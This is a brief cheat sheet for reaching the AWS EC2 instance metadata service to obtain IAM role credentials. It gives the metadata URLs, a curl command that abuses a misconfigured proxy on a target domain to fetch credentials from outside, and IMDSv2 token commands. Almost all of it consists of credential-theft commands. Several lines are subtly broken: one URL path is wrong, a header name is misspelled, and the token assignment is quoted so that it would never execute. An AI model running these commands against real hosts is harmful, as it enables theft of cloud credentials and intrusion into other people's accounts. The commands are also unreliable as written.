# Instance Metadata Service URL

 - http://169.254.169.254/latest/meta-data

### Additional IAM creds possibly available here

 - http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_ROLE_NAME

### Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS and misconfigured

 - curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/metadata/iam/security-credentials/ && echo

### IMDS Version 2 has some protections but these commands can be used to access it

 - TOKEN='curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadatatoken-ttl-seconds: 21600"'

 - curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token:$TOKEN"
